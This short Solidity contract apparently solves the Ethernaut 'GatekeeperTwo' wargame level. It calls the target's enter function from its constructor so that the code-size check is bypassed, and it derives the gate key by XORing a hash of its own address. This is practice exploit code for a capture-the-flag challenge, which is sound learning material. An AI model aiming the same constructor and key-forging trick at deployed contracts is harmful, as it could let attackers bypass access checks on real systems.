// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract Gatekeeper2Enter {
    event Response(bool success, bytes data, uint256 gas);

    constructor(address gatekeeper) {
        uint64 key = uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max;
        (bool success, bytes memory data) = gatekeeper.call(
            abi.encodeWithSignature("enter(bytes8)", bytes8(key))
        );
    }
}